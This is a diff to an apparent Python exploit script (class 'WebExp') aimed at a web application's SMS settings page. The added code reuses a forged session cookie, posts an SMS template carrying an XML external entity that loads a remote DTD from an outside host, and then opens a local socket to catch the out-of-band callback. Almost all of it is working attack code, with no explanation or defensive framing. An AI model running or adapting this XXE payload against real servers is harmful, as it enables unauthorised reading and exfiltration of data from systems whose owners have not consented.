@@ -1,3 +1,4 @@
+#coding:utf-8
 import re
 import sys
 import socket
@@ -129,7 +130,6 @@ class WebExp:
             "title": "hhh",
             "wmd-input": payload
         })
-        print rs.status_code
 
         s = socket.socket()
         s.bind(("127.0.0.1", 8234))
@@ -152,7 +152,41 @@ class WebExp:
 
         self.session.cookies.set('username',None)
         self.session.cookies.set('username', value)
-        rs=self.session.get(self.url+'user').text
+        rs=self.session.get(self.url+'settings/sms')
+        token=self._get_token(rs.text)
+        rs=self.session.post(url=self.url+'settings/sms',data={
+            self.csrfname: token,
+            "force_phone_check": "on"
+        })
+        rs=self.session.post(url=self.url+'settings/sms',data={
+            self.csrfname: token,
+            "force_phone_check": "on",
+            "api_url":"http://10.85.6.104:8200/api/send_sms",
+            "method":"1",
+            "name":"data",
+            "template":u'''
+            <?xml version="1.0" encoding="utf-8"?>
+            <!DOCTYPE remote SYSTEM "http://169.254.200.186:8000/payload.dtd" >
+            <root>;
+                <tel>{tel}</tel>
+                <text>【VYG乐购】您的验证码为： {code} &remote;</text>
+            </root>
+            '''
+        })
+        #print rs.text
+        self.session.cookies.clear()
+        self.register_test()
+        s = socket.socket()
+        s.bind(("127.0.0.1", 8235))
+        s.listen(5)
+        print("start listening ...")
+        while True:
+            con, address = s.accept()
+            buf = con.recv(1024)
+            if 'GET' in buf:
+                break
+
+        print buf
 
         return True
 
